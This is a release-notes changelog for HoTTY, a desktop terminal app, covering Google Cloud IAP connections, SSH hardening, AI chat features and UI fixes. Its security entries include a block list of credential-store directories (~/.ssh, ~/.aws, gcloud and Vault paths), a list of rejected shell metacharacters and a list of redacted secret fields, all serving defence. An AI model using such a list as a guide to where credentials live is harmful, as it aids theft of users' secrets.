A UX overhaul for Google Cloud IAP. IAP is no longer a per-host form field — the New Session dialog gains a dedicated **GCP** tab that browses every GCE instance across every project you have access to, with live status, start/stop controls, and a one-click connect. The connect path also now handles the "VM is stopped" case gracefully: HoTTY prompts before starting, or auto-starts when the host is configured to.

### Breaking Changes

- **Google Cloud IAP is no longer in the Protocol dropdown.** Both the **New Session** dialog and the host-tree add/edit modal drop the `Google Cloud IAP` protocol entry. Existing IAP entries in your saved host tree still connect on double-click (the IAP protocol itself, the `iapTunnel` shape, and the `gcloud-iap` connection path are unchanged on disk and at the backend), but they can no longer be created or edited through the host-tree form. To make a new IAP connection, open the **GCP** tab in the New Session dialog and double-click the VM you want.

### New Features

- **New GCP Instances tab in the New Session dialog.** A second tab next to **Hosts** lists every Google Compute Engine VM across every project you have access to, grouped by project, with live status glyphs (🟢 RUNNING, 🔴 stopped, 🟡 transitioning) and the last-refreshed timestamp. Selecting an instance highlights it; **double-clicking** an instance connects via IAP immediately. Each row has its own **Start** / **Stop** buttons — backed by `gcloud compute instances start` / `stop` — that show an optimistic "starting…" / "stopping…" label while polling `describe` for the real transition (PROVISIONING / STAGING / STOPPING) so the row reflects what GCP is actually doing. A top-of-pane **Refresh** action re-runs the full inventory: gcloud check, auth check, `projects list`, then `instances list --filter='zone:*'` per project. The pane streams progress (`gcloud → auth → projects → instances → done`) so a long refresh against many projects doesn't look hung.
- **Pre-connect VM auto-start prompt.** When you start an IAP connection — from the GCP tab, from a legacy saved IAP host entry, or from anywhere else — and the target VM is in `TERMINATED` or `SUSPENDED`, HoTTY now intercepts the connect before tunneling and either auto-starts the VM (when the saved host entry has `autoStart` set) or surfaces a modal asking whether to start it. The backend awaits the user's decision via a session-scoped one-shot and only proceeds with the IAP tunnel once the VM reaches `RUNNING`. Previously a connect to a stopped VM would hand off to `gcloud start-iap-tunnel`, hang briefly, and fail with an opaque tunnel error. One-shot connects from the new GCP tab default to auto-start (the user explicitly chose that VM, so prompting again would be churn).

## v2.0.3-beta1

A diagnostic-focused pre-release. The headline change instruments the Google Cloud IAP connection path end-to-end so when an IAP connect fails in a real environment, the debug log captures every phase boundary — gcloud and ssh.exe resolution, OS Login detection result, full subprocess argv and PIDs, gcloud stdout/stderr line-by-line, TCP-probe attempts, and elapsed times — instead of surfacing as an opaque "connection failed" string.

### Improvements

- **Google Cloud IAP connect now writes detailed phase-by-phase diagnostic logs.** Connecting via Google Cloud IAP now emits info-level logs at every step to the debug log file (open via the **Open Debug Log Folder** action). The log records the resolved `gcloud` program and `ssh.exe` paths, the presence of relevant environment variables (`PATH`, `APPDATA`, `USERPROFILE`, `CLOUDSDK_CONFIG`, …), the OS Login detection result and resolved username, the full `gcloud start-iap-tunnel` and `ssh.exe` argv, both subprocess PIDs, every line of `gcloud` stdout/stderr (previously debug-level and silently dropped in release builds), TCP-probe attempts against the picked local port, a heartbeat while waiting for tunnel-readiness, the captured `combined_log` if `gcloud` exits prematurely or readiness times out, and elapsed times for each phase. When an IAP connect fails, attaching this log file to a bug report is now enough to triangulate the cause (auth / network / OS Login / SSH key) without further reproduction.

## v2.0.2

A maintenance release. The headline change is a fix to the Google Cloud IAP tunnel readiness detection that caused fresh IAP connections to retry several times before succeeding. Two security follow-ups close renderer-side bypass gaps in the file-drop and ping-monitor flows — both no-known-exploit, but they were quietly eating into the dialog-attestation pattern used elsewhere in the app — and a small theming and UI consistency pass rounds out the release.

### Improvements

- **Hidden AI tab gradient is now themeable end-to-end.** Added a new `--color-danger-shade` theme variable (a darker variant of `--color-danger`) for the gradient endpoints on hidden AI chat tabs. Previously the endpoints mixed toward a hardcoded `black`, which looked right on dark themes but didn't reverse on light. Custom themes can now tune the shade alongside the other danger colors via **Settings &rarr; Appearance &rarr; Create Custom Theme &rarr; Status & Signals**.
- **Text Editor pane button consistency.** The Text Editor menu button and find-bar button now follow the standard `:hover:not(:disabled)` pattern (matching the Log Viewer and Ping Monitor toolbar buttons), and the find-bar button drops a stray border so it visually matches the menu button in the same pane.

### Bug Fixes

- **gcloud IAP tunnel readiness detection no longer trips on Python stderr buffering.** Connecting via Google Cloud IAP would silently fail readiness detection because `gcloud`'s `tunnel-through-iap` subprocess block-buffers its stderr when piped, so the "Listening on port N" line never reached HoTTY in time and the connect retried. Detection is now a TCP probe against the chosen local port rather than a stderr text scan, and the redundant pre-connect probe is removed.

### Security

- **Text Editor file-drop now requires explicit user attestation.** When the renderer asks the backend to approve a file path that was dragged into the Text Editor, the backend now shows a native OS confirm dialog before adding the path to the approved set. The previous flow accepted any non-symlink, non-sensitive, &le;50 MB path that the renderer supplied, which left a renderer-side bypass of the dialog-attestation pattern already used by `text_editor_open_file` / `text_editor_save_file`. Approvals are cached per-session so re-opening the same file in the same launch does not re-prompt; a fresh app launch prompts again. The Tauri-level drag-and-drop event is still disabled, so the prompt cannot be triggered without a renderer-initiated request.
- **Ping Monitor CSV logging now requires a user-approved log directory.** When CSV logging is enabled on a ping monitor, the backend now consults `LogManager::is_dir_approved` before writing the file — matching the gating already in place for session logging. If the directory has not been approved via the **Browse...** picker or the native confirm dialog, the monitor still runs but does not produce a CSV (and does not emit a fake log-file path back to the renderer). Use the **Browse...** button on the Ping Monitor pane to approve the directory once; the approval persists alongside the existing session-log approvals.

## v2.0.1

A focused follow-up to v2.0.0. The headline change makes **Google Cloud IAP** a top-level protocol so IAP connections no longer require any SSH credentials. The rest is security — two file-system protections that close a renderer-side enumeration gap and repair a Windows-only matcher bug that had been silently disabling the existing sensitive-path checks — plus a small UI-font consistency pass left over from the v2.0.0 polish round.

### New Features

- **Google Cloud IAP is now a first-class protocol.** Previously a "Connect via Google Cloud IAP" checkbox inside the SSH form, IAP is now its own entry in the Protocol dropdown (in both the New Session dialog and the host-tree add/edit modal). When you select it, the username / password / private-key fields disappear entirely — HoTTY delegates the connection to <code>gcloud compute ssh --tunnel-through-iap</code>, which handles the IAP tunnel, OS Login mapping, automatic SSH key generation (<code>~/.ssh/google_compute_engine</code>), key registration with the project, and authentication on your behalf. You only need a Google Cloud SDK install and a completed `gcloud auth login`. The host tree shows IAP entries as `<project>:<instance> (IAP)` so they're easy to recognise.

### Improvements

- **UI font consistency.** Action buttons in the **Confirm**, **Paste Confirmation**, **SSH Host Key**, **Ask AI**, and **Custom Theme Creator** modals, plus toolbar buttons in the **Log Viewer**, **Ping Monitor**, and **Text Editor** panes, now use the UI chrome font (`--ui-font-family`). Several were rendering in the monospace `--font-family`, which looked subtly off against the surrounding chrome. Inner monospace content (paste preview, host-key fingerprint, etc.) is unchanged. The Confirm, Ask AI, and Custom Theme Creator modal containers also pick up an explicit chrome-font declaration that was missing.

### Security

- **File Explorer refuses to list sensitive directories.** The file-browser pane (and the underlying `file_explorer_list_directory` Tauri command) now refuses to enumerate paths that resolve under credential-store directories — `~/.ssh`, `~/.aws`, `~/.azure`, `~/.gnupg`, `%APPDATA%\Roaming\gcloud`, `%APPDATA%\Local\Microsoft\Vault`, HoTTY's own `%APPDATA%\{Roaming,Local}\com.hotty.terminal`, and the rest of the existing block-list. Previously the renderer could enumerate any directory; while contents were not exposed, filenames and mtimes leaked which credentials existed and when they were last touched. This is defence-in-depth — exploitation required a renderer compromise to begin with — but the Text Editor and Log Viewer read paths were already gated this way, and the File Explorer should match.
- **Sensitive-path matcher repaired on Windows.** `is_sensitive_path()` — the gate behind the Text Editor read/write, dropped-file approval, and Vertex AI service-account key file flows — compared canonical paths via a `starts_with(home + dir)` prefix check. On Windows, `canonicalize()` returns paths with a `\\?\` verbatim prefix, which the matcher did not strip, so the comparison never matched and the gate was effectively a no-op on canonical paths. The matcher now strips the verbatim prefix from both the resolved path and the home directory before comparing, and a regression test covers it. No exploitation has been reported, but the on-disk protection these flows were nominally enforcing now actually fires.

## v2.0.0

The v2.0.0 stable release. A final hardening pass lands five additional defence-in-depth measures around credential storage and the Tauri command surface, plus minor visual cleanup across the modal family.

### Improvements

- **Modal consistency polish.** Several minor visual inconsistencies were aligned across the modal family: **Ask AI** now clips its content cleanly to the rounded corners while scrolling, the **System Prompt** overlay no longer adds an extra inset, the **Custom Theme Creator** dialog uses the standard modal z-index, and the **Paste Confirmation** and **SSH Host Key** dialogs use the chrome font for their containers (inner monospace previews and fingerprints unchanged). The Text Editor menu, find-bar, and find-close buttons now use the standard 4px corner radius.

### Security

- **AI service-account key files require dialog attestation.** Vertex AI's `service_account` auth path now refuses any `keyFilePath` that was not picked through the native file dialog. A compromised renderer can no longer point AI authentication at an arbitrary on-disk JSON key. The `auto_auth` resume path is unaffected — it loads `client_email` and `private_key` from the DPAPI-encrypted on-disk config and never re-reads the user's key file.
- **DPAPI ciphertexts are now bound to HoTTY.** New credentials are encrypted with `CryptProtectData` using HoTTY-specific entropy plus an internal "HoTTY" marker prepended to the plaintext. The renderer-callable `dpapi_decrypt` / `dpapi_decrypt_batch` commands therefore refuse foreign DPAPI blobs (e.g. another application's encrypted-key blob), where they previously functioned as a generic per-user decrypt oracle. Pre-entropy `[SAFE]` blobs from earlier HoTTY versions still decrypt transparently and upgrade in place on the next save.
- **Sensitive-path block list extended.** The Text Editor and dropped-file approval flow now refuse paths under `~/.aws`, `~/.azure`, `%APPDATA%\Roaming\gcloud`, `%APPDATA%\Local\Microsoft\Vault`, `~/.config/gcloud`, and HoTTY's own `%APPDATA%\{Roaming,Local}\com.hotty.terminal` directories. The last entry matters: it prevents a write-via-editor path from tampering with HoTTY's `approved_log_dirs.json`, `vertexai_config.json`, etc., which would otherwise undermine the dialog-attestation invariants used elsewhere in the app.
- **Telnet auto-login no longer leaks the password as the username.** A telnet server whose pre-login banner ended in `...Password:` (instead of the expected `Username:`) used to make the auto-login state machine fall straight through to the password phase before sending the username — causing the configured password to be sent into the username field. The state machine now reacts only to a real username prompt while waiting for the username.
- **Backend session config debug output redacts credentials.** `SshConfig`, `TelnetConfig`, and `JumpboxConfig` no longer expose `password` / `private_key_passphrase` values through Rust's `{:?}` debug formatter. They were not reaching any log call site today; this is defence-in-depth against a future log-format regression accidentally dumping them.

## v2.0.0-beta13

A second hardening pass before the stable release. Terminal font and scrollback settings now apply to already-open sessions, AI Chat tabs follow their linked terminal through close events, and three security mitigations land around frontend logging, log-folder access, and external URL opening.

### Improvements

- **Terminal font and scrollback updates apply to open sessions.** Changing **Settings &rarr; Appearance &rarr; Font Size**, **Font Family**, or **Settings &rarr; General &rarr; Scrollback Buffer** now retunes already-running terminals immediately. Previously the new values only took effect for new connections.
- **AI Chat tabs follow session lifecycle.** When a terminal session closes (auto-close on disconnect or manual close), tabs in any AI Chat pane that were linked to that session are closed too. The last tab in a pane is unlinked instead of closed so the pane keeps a usable tab.
- **Modal close-X buttons unified.** The header close-X font size in **Ask AI** and **System Prompt** dialogs now matches the rest of the modal family.

### Security

- **Log folders require explicit approval.** Logging only writes to — and Log Viewer only reads from — folders that the user has approved. Picking a folder via the **Browse...** button approves it automatically; a typed path triggers a native OS confirm dialog the first time it is used. Approvals are persisted to `%APPDATA%\com.hotty.terminal\approved_log_dirs.json` (per-user, renderer cannot write to it), so the dialog only appears once per folder ever — not on every app launch. A compromised renderer cannot synthesise that approval, so it cannot point logging or the Log Viewer at attacker-supplied paths just by calling Tauri commands.
- **External URLs outside a curated allowlist now require user confirmation.** Links to the HoTTY repository, gcloud install docs, the GPL license, and the Google OAuth consent flow continue to open immediately. Any other URL — including links the user clicks in terminal output or AI chat — opens a native confirm dialog showing the full URL before it is handed to the system browser. The Tauri capability scope is correspondingly narrowed so only the curated hosts are reachable through the plugin.
- **Frontend log forwarding redacts credential-like fields.** Calls to `logDebug` (the channel that forwards messages from the renderer to the persisted debug log under `%APPDATA%/com.hotty.terminal/logs/`) now strip values for fields named `password`, `apikey` / `api_key` / `api-key`, `secret`, `token`, `clientSecret`, `privateKey`, `refreshToken`, `accessToken`, plus `Bearer` HTTP headers. Messages are also capped at 4 KB on both ends. This is defence-in-depth: it does not fix a known leak in current code, it limits the blast radius of any future regression that accidentally logs a credential.

## v2.0.0-beta12

A hardening pass before the stable release. Modernised SSH algorithm defaults, a stream-idle watchdog for AI Chat, fixes for several quiet data-integrity bugs (host tree, AI chat history, persona settings), and a sweep of UX polish around modals, focus, and validation.

### New Features

- **AI Chat tab → linked terminal flash** — clicking an AI Chat tab whose conversation is linked to a terminal session briefly highlights that terminal pane so you can tell at a glance which session it belongs to.
- **AI stream idle watchdog** — if an AI provider stops sending data mid-response (network drop, hung backend, etc.), the in-flight request is cancelled after 3 minutes of silence and the chat shows an error instead of staying stuck on "streaming".
- **`diffie-hellman-group-exchange-sha1` confirmation prompt** — enabling this deprecated KEX in **Settings → Protocols → SSH Algorithms** now shows a warning dialog explaining that SHA-1 is broken and offering safer alternatives.
- **OS-locale-aware AI Chat language** — first-run users on Japanese-locale machines now see the AI Chat language set to 日本語 by default instead of English. Existing users keep whatever they had selected.
- **SessionDialog input validation** — the connection form now catches empty hosts, ports outside 1–65535, malformed GCP project IDs, and CRLF/whitespace injection before the connect is attempted.

### Improvements

- **Modern SSH KEX defaults** — `diffie-hellman-group14-sha256` ships enabled and `diffie-hellman-group1-sha1` ships disabled in the bundled algorithm list. Existing users keep their saved choices; algorithms newly added in a release are merged into the user's saved file on load so security improvements aren't blocked behind a manual reset.
- **Jumpbox host-key prompt now times out** — leaving the bastion's host-key prompt unanswered used to hang the whole connect indefinitely. The prompt now disconnects after 5 minutes if no response.
- **Modal Escape stack** — pressing Escape with multiple modals open now only closes the topmost one. Previously every mounted modal's listener fired in parallel and could close background dialogs you didn't see.
- **Focus is restored after a modal closes** — closing a modal returns focus to whatever element had it before the modal opened (input field, terminal, button) instead of leaving focus stranded on a removed button.
- **Multi-byte prompt detection** — terminal text is now NFC-normalised before matching against your prompt-pattern regex, so prompts containing combining marks or full-width characters (Japanese, accented Latin) are detected consistently regardless of how the device sent them.
- **Surfaced silent failures** — clipboard copy and session-logging toggle failures now show as toast notifications instead of being swallowed, and AI Chat surfaces invoke errors that previously left the UI stuck in a "streaming" state.
- **Faster failure on unreachable AI providers** — AI HTTP requests now have a 30-second connect timeout so misconfigured endpoints fail quickly rather than hanging the chat.

### Bug Fixes

- **Session disconnect was leaking background tasks.** SSH/Serial/WSL/Local sessions used `tokio::time::timeout` on the reader/writer/keepalive task handles, but timing out only dropped the JoinHandle (detached the task) instead of aborting it. Long-lived runs slowly accumulated zombie tasks. The grace period is now 1.5 seconds and overruns are explicitly aborted.
- **AI Chat could break after cancelling a response.** Cancelling a stream left the user message in chat history without an assistant reply, violating the user/assistant alternation Anthropic requires. The next request would be rejected by the API. Cancelled turns now record an `[cancelled]` placeholder so subsequent messages send cleanly.
- **`aiCommandIdleTimeoutSecs`, custom AI personas, and other settings could be wiped on upgrade.** The settings migration unconditionally overwrote `aiPersonas` with the bundled defaults at version bumps. Customised prompts and user-added personas are now preserved across upgrades; use **Reset All Personas** in Settings to pull in the latest stock prompts on demand.
- **Update notifier got the order of `beta9` vs `beta10` wrong.** Lexicographic string compare ranked `beta10 < beta9`, so users on `beta10` could be told a `beta9` was newer (or no update was offered). Pre-release tags are now compared numerically when they share the same alphabetic prefix.
- **Host tree edits could be lost under rapid edits.** Encryption is asynchronous, and two quick edits could complete out of order — the older encryption result would overwrite the newer one in `localStorage`. Writes are now guarded by a monotonic counter so only the most recent encryption is persisted.
- **Session status briefly flickered through duplicate error transitions.** Both the connect-promise catch block and the `onSessionError` listener pushed a state update + log entry for the same failure. The redundant path is now suppressed.
- **Re-opening Settings could show a stale "enable SHA-1?" warning dialog.** If the user closed the Settings modal while the confirmation prompt was up, the pending state survived and the dialog reappeared on the next open. The state now resets on tab unmount.
- **Closing an AI Chat pane before its linked terminal leaked watch buffers.** The buffer for the linked session lingered until the session itself was removed. Session removal now always evicts its buffer regardless of which pane was watching.

### Security

- **Text Editor refuses to approve dropped symlinks.** Dragging a file into the Text Editor now rejects symbolic links directly so a user can't be tricked into approving a link that resolves to a sensitive location.
- **`known_hosts` write failures are now visible to the user.** When SSH cannot save or remove an entry (permission denied, disk full, etc.) the failure is logged and an `ssh-known-hosts-warning` event is emitted so you find out at the time, not on the next connection where the host key prompt reappears unexpectedly.
- **DPAPI passthrough now warns on suspicious input.** When the credential decryptor falls back to plaintext passthrough on input that *looks* prefixed (starts with `[` but with an unknown tag), it now logs a warning so accidental corruption of the encryption tag is visible in logs.

## v2.0.0-beta11

A correctness and security release. The SSH algorithm preferences in Settings now actually drive the handshake (they were previously cosmetic), unblocking legacy devices that need SHA-1 KEX, 3DES, or DSA host keys, and the jumpbox SSH path picks up the same `known_hosts` I/O hardening already applied to the direct path.

### Bug Fixes

- **SSH algorithm preferences from Settings now apply to connections.** Previously the kex / cipher / MAC / host-key toggles in **Settings &rarr; Protocols &rarr; SSH Algorithms** were saved but never read by the SSH client — every session offered russh's hardcoded default list regardless of what was selected in the UI. They now drive the handshake for both direct SSH and jumpbox connections. This unblocks legacy devices (e.g. Cisco Catalyst 3650, older Cisco IOS) that require SHA-1 KEX (`diffie-hellman-group14-sha1`, `diffie-hellman-group1-sha1`, `diffie-hellman-group-exchange-sha1`), `3des-cbc`, or `ssh-dss` host keys — these are now selectable and effective.
- Disabling every algorithm in a category now fails the connection with a clear error rather than silently falling back to library defaults. Unknown algorithm names in the saved config log a warning and are skipped instead of being silently ignored.

### Security

- **Jumpbox known_hosts I/O errors now refuse the connection** instead of treating the host as new. Matches the existing hardening on the direct SSH path; prevents an attacker who can corrupt or chmod-zero the bastion's `known_hosts` from coaxing the user back into a "new host" prompt and accepting an attacker-controlled key.

## v2.0.0-beta10

A major AI Chat UX overhaul: per-pane tabs with smart linking to terminal sessions, an inline execution mode bar with pause/resume, a new device-response idle timeout, and a tightened Network Expert persona prompt.

### New Features

- **AI Chat tabs** — AI Chat panes now host multiple tabs in a top-of-pane tab strip. Toggling **AI Monitor** on a terminal links a tab to that session; turning it on for additional terminals creates a new tab per terminal so concurrent watch streams stay separated. Selecting a terminal mirrors the active AI tab back to the matching link, and the currently linked terminal is shown as a chip next to the input. Use **+ New chat** to start a fresh tab.
- **Inline execution mode bar with pause/resume** — the AI Chat pane now has an Execution Mode chip docked at the bottom of the input card with a dedicated pause/resume control for the auto-run loop. The same controls used to live behind a Settings dialog.
- **AI command idle timeout** — new `aiCommandIdleTimeoutSecs` setting (default 10 seconds, `0` disables, 30-minute hard cap) replaces the previous silent 30-second wall-clock timeout in the AI execute polling loop. When the timeout fires, the captured output and a `[no response from device for N seconds]` note are sent to the AI so the conversation continues instead of stalling.

### Improvements

- **AI Chat UX redesign** — chip-style mode picker, linked-terminal chip, empty-state onboarding, send-disabled hints, and live streaming-token feedback.
- **Unified AI Chat input** — input, attachments, and the execution-mode chip are now part of a single rounded card with the chip right-aligned for a cleaner footprint.
- **AI Chat header settings popover** — settings previously scattered across the AI Chat header are consolidated into a popover triggered from the input toolbar; the standalone System Prompt button is removed and now lives inside the popover.
- **Collapsible terminal output blocks** — terminal output captured into AI Chat messages renders as a collapsible block with the first command line, line count, and character count visible in the header. Click or press <kbd>Enter</kbd>/<kbd>Space</kbd> to expand.
- **Network Expert persona prompt** — rewritten with a leading mandatory start-of-session protocol (REPLY 1: show-version equivalent, REPLY 2: terminal-length-0 equivalent, REPLY 3+: address user) so paginated devices no longer stall the AI response loop.
- **SSH/Telnet connect timeout default** — bumped from 3 seconds to 5 seconds, more forgiving to slower jumpbox / IAP-tunnel paths.

### Bug Fixes

- **AI Chat target chip stuck** — the linked-terminal chip now clears when its session is removed or **AI Monitor** is turned off, instead of staying displayed against a non-existent session.
- **AI execute output truncation** — fixed a path where long terminal output captured for the AI execute loop was truncated before reaching the model.

## v2.0.0-beta9

Automatic v1→v2 host-tree credential migration, paste-flow fixes, and security hardening around the asset protocol and SSH known-hosts handling.

### Improvements

- **Automatic v1→v2 host-tree credential migration** — host trees imported or carried over from the previous Electron build of HoTTY (v1) used `[SAFE]` + base64(`v10` + DPAPI blob) for `username` / `password`. On first load, those entries are now upgraded in place to the v2 format (`[SAFE]` + base64(DPAPI blob)). The migration runs in the Rust backend, is idempotent (v2 entries pass through byte-for-byte), and plaintext credentials never cross the IPC boundary.

### Bug Fixes

- **Ctrl+V pasted clipboard content twice** — pressing Ctrl+V used to insert the clipboard content once before the paste-confirmation dialog opened, and again when the user clicked "Paste". xterm.js's internal `paste` DOM listener was firing independently of our keydown interceptor. The terminal host now suppresses the native paste event so the confirmation dialog is the sole paste path. Right-click paste was unaffected.
- **Terminal lost focus after the paste-confirmation dialog closed** — confirming or cancelling the paste dialog left focus stranded on the (now-removed) Paste button, requiring an extra click before the keyboard worked again. Focus is now restored to the originating terminal pane after the dialog unmounts.

### Security

- **Tighter Tauri asset protocol scope** — the `assetProtocol.scope` in `tauri.conf.json` was widened to `**` (any path) earlier in the v2 line. It is now restricted to image extensions only (`.png`, `.jpg`, `.jpeg`, `.gif`, `.bmp`, `.webp`, `.ico`, `.svg`). The pane-background-image feature continues to work; defense-in-depth against renderer compromise.
- **SSH refuses connection on known_hosts I/O errors** — previously, *any* error reading `known_hosts` (permission denied, disk failure, partial read) was silently treated as "this is a new host" and the user was re-prompted. An attacker who could corrupt or chmod-zero the file could exploit this to coax the user into accepting a substituted host key for an already-trusted host. Real I/O errors now log and refuse the connection; "file not found" still correctly returns the new-host prompt for first-time users.

## v2.0.0-beta8

Connection lifecycle UI, horizontal scrolling for unwrapped lines, and a rebuilt terminal layout that keeps the marker and scrollbar pinned to the right edge.

### New Features

- **Connection lifecycle overlay** — sessions now show a Connecting overlay while the transport is being established, and surface failures via dismissible toast notifications instead of failing silently. Session status gains explicit `connecting` and `error` values, with dedicated theme colors for the tab and pane border.
- **Configurable connect timeout** — SSH and Telnet connections now time out after a user-configurable interval (default 3s) instead of hanging indefinitely.
- **Horizontal scrolling when Line Wrap is off** — disabling Line Wrap re-enables a horizontal scrollbar on terminal panes that grows as the cursor advances past the right edge. Pressing Enter snaps the scroll back to column 0, and the host auto-scrolls to keep the cursor in view as you type.

### Improvements

- **Three-rail terminal layout** — the prompt marker indicator and the vertical scrollbar are now rendered in dedicated DOM rails outside the xterm host. They stay anchored to the pane's right edge regardless of the host's horizontal scroll position, so scrollbar, marker, and text never overlap.
- **Custom vertical scrollbar in terminals** — replaces xterm v6's default Monaco-style scrollbar with one that matches the rest of the app's chrome (driven by the global scrollbar styles).
- **Connecting-state theme colors** — added matching defaults across Dark, Medium, and Light themes for the new connecting tab/pane state.

### Bug Fixes

- **Prompt marker color** — prompts now correctly use the prompt-default theme color (red), with the prompt-active color (blue) reserved for non-prompt content.
- **Prompt marker detection** — replaced a stale buffer-position reference that caused intermittent detection misses, and trailing unused rows no longer carry markers.
- **Prompt marker positioning** — markers are now anchored to the right edge directly, so positioning no longer drifts with the parent's left edge or horizontal scroll. Includes a CSS fallback for overlay scrollbars and a content-based check that survives cursor transitions during startup.
- **Scrollbar corner artifacts** — hides the bottom-right scrollbar corner / resizer / button artifacts that previously appeared in some panes.
- **Terminal viewport could rewind on output** — in the three-rail layout introduced in this release, fast terminal output (e.g. `dir` listings) could leave the viewport one line behind, hiding the latest prompt until the next keypress forced a re-scroll. The custom scrollbar rail now updates its spacer geometry synchronously with terminal scroll events, so the viewport stays aligned with the newest output.

## v2.0.0-beta7

Safer in-place upgrades, a dependency security update, and modal stacking fixes.

### Bug Fixes

- **Installer no longer defaults to "Uninstall before installing" on upgrade** — when the installer detects an existing HoTTY installation, the **"Don't uninstall (keep settings)"** radio is now pre-selected and focused for upgrade and downgrade scenarios. Previously the destructive "Uninstall" option was the default, and clicking through could wipe the HostTree and AI provider credentials stored in WebView2 local storage. Same-version reinstall behavior is unchanged.
- **Help modal z-index** — corrected from `10001` to `10000` so it follows the base-modal convention; the previous value risked layering above unrelated nested overlays.
- **Save-confirm modal z-index** — corrected from `10001` to `10000` for the same reason; this dialog is never shown over another modal.

### Security

- **DOMPurify upgraded to 3.4.0** — addresses [GHSA-39q2-94rc-95cp](https://github.com/advisories/GHSA-39q2-94rc-95cp), where `ADD_TAGS` short-circuit evaluation could bypass `FORBID_TAGS`. AI-rendered markdown is sanitized through DOMPurify, so this hardens that surface.

## v2.0.0-beta6

Sixth beta release, focused on UI polish, futuristic theming effects, customizable empty-pane backgrounds, and continued security hardening.

### New Features

- **Unused pane background** — in **Settings → Appearance**, choose a solid color or custom image to display in empty grid panes
- **Futuristic theme effects** — new **Futuristic Effects** section in the Custom Theme Creator: neon glow on active panes and sidebar icons, glassmorphism backdrop blur on modals, and configurable icon stroke width / glow blur
- **File Explorer sidebar preference** — File Explorer now opens into an empty sidebar slot by default (new `preferSidebar` pane allocation strategy) instead of filling a grid cell
- **Empty pane drop hints** — empty grid cells display their pane number and a "Drop Tab Here" hint to guide tab placement

### Improvements

- **Settings UI redesign** — Appearance, Features, General, and Protocols tabs reorganized into grouped "cards" with section titles (Layout, Theme, Font, Terminal Display) for easier scanning
- **Theme refresh** — brighter `accent-color` (`#00b4ff` in dark) plus new `prompt-highlight-default`, `glow-*`, and `glass-*` theme variables across Dark, Light, and Medium themes
- **Lighter-weight icons** — SVG stroke width reduced from `2` to `1.5` across AI Chat, File Explorer, Log Viewer, Ping Monitor, Help, App Sidebar, Tab Bar, and Sidebar for a more refined look
- **Backdrop blur on modals** — subtle 6px blur behind all modal overlays
- **Prompt highlight default tracks theme** — when unset, the terminal prompt highlight color falls back to `--prompt-highlight-default` so it follows the current theme
- **Ask AI modal styling** — restored primary-button background, padding, and hover state that had regressed
- **Dependency cleanup** — removed unused `@tauri-apps/plugin-shell` npm dependency

### Bug Fixes

- **v1 htree import no longer corrupts credentials** — fixed field-mapping bug where imported usernames and passwords from legacy v1 host trees were mangled
- **About tab GitHub link** corrected and repository URL updated to `horryworks/HoTTY-Rust-Tauri`
- **Duplicate session race** — `connect_session` now re-checks for duplicate session IDs after connect completes and safely disconnects the new service on collision

### Security

- **Text Editor TOCTOU hardening** — `text_editor_read_file` / `write_file` re-validate the resolved path and file size at I/O time, guarding against symlink swaps after the dialog approval
- **Log Viewer TOCTOU fix** — `read_log_file` reads from the re-canonicalized path rather than the originally resolved path
- **HTML sanitizer tightened** — DOMPurify now forbids `svg`, `iframe`, `object`, `embed`, `script`, `link`, `base` tags and a broad set of `on*` event-handler attributes in AI-rendered markdown
- **WSL distribution name validation** — rejects shell metacharacters (`$`, backtick, `;`, `&`, `|`, redirects, quotes, whitespace) before the regex check as defense-in-depth
- **GCP IAP tunnel argv hardening** — gcloud invocations pass arguments as an argv array on Windows (`cmd /C gcloud.cmd <args>`) instead of a manually-escaped shell string, eliminating quoting-based injection risk
- **Asset protocol scoping** — enabled Tauri `protocol-asset` with an explicit CSP `img-src` allowance for `http://asset.localhost` so user-selected pane background images can be served safely

## v2.0.0-beta5

Fifth beta release, focused on security hardening, themeable AI provider branding, and UI polish.

### Improvements

- **Themeable AI provider icons** — the Gemini gradient, OpenAI, Anthropic, and Vertex AI icon colors are now driven by theme variables (`provider-gemini-1/2/3`, `provider-openai`, `provider-anthropic`, `provider-vertex-ai`) and exposed as a new **AI Providers** section in the Custom Theme Creator
- **Shell plugin replaced with opener** — migrated from `tauri-plugin-shell` to the lighter-weight `tauri-plugin-opener` for external URL handling, reducing the allowed capability surface
- **AI provider streaming cleanup** — Anthropic, Gemini, OpenAI, and Vertex AI providers now emit the chat-done event on cancellation/empty responses, avoiding orphaned loading states
- **Modal consistency** — standardized action-button padding (`6px 16px`) and footer gap (`8px`) across ConfirmModal, PasteConfirmationModal, and AskAiModal per the UI conventions

### Security

- **SSH credential zeroization on auth failure** — passwords and key passphrases are now wiped from memory immediately after the authentication attempt, whether it succeeds or fails, closing a window where plaintext secrets could linger on failed login
- **IAP tunnel zone filter hardening** — GCE instance listing now passes the zone via the dedicated `--zones=` flag rather than a `--filter=zone:(…)` expression, eliminating exposure to gcloud filter-syntax edge cases
- **DPAPI unsafe-block documentation** — added explicit SAFETY invariants to both `CryptProtectData` / `CryptUnprotectData` call sites covering buffer initialization, lifetime, and `LocalFree` ownership

## v2.0.0-beta4

Fourth beta release, focused on jumpbox tunneling, auto-update notifications, safer editing workflows, and security hardening.

### New Features

- **SSH/Telnet Jumpbox (bastion) tunneling** — connect through an SSH bastion host to a target SSH or Telnet server via `direct-tcpip` channel forwarding, with its own host-key verification and keyboard-interactive auth
- **Auto-update notification** — on startup, checks the GitHub releases API for a newer version and shows a dismissible notification linking to the release page
- **Unsaved changes prompt** — Text Editor now shows a Save / Discard / Cancel modal when closing a tab or quitting with unsaved edits, backed by a dirty-editor tracker shared across panes
- **AI System Prompt viewer** — inspect the effective system instruction sent to the current AI persona, with copy-to-clipboard support
- **React Error Boundary** — top-level error boundary catches renderer crashes and shows a recoverable fallback instead of a blank window

### Improvements

- **Telnet service** — refactored connection path to share the jumbox tunnel abstraction with SSH, unifying transport handling
- **tauriService** — added typed wrappers for the new updater and jumpbox commands
- **useResize hook** — small ergonomics improvements for pane drag-to-resize
- **App shell** — composed UpdateNotification, SaveConfirmModal, SystemPromptModal, and ErrorBoundary into the top-level layout

### Security

- **SSH credential validation** — added length caps (host, username, password, passphrase) in `SshConfig::validate` to reject malformed or oversized inputs before they reach the SSH stack
- **Log viewer TOCTOU mitigation** — re-canonicalizes the resolved path immediately before reading and re-checks the allowed-directory guard, preventing symlink swap attacks between the check and the read
- **Font enumeration unsafe hardening** — added null-pointer and alignment validation in the Windows font-enumeration callback before dereferencing OS-supplied pointers

### Housekeeping

- **Removed unused asset** — deleted `public/HoTTY_logo.png` (not referenced by the app)
- **Added tests** — new unit tests for the dirty-editor tracker utility

## v2.0.0-beta3

Third beta release, focused on theme customization, UI refinements, and expanded test coverage.

### New Features

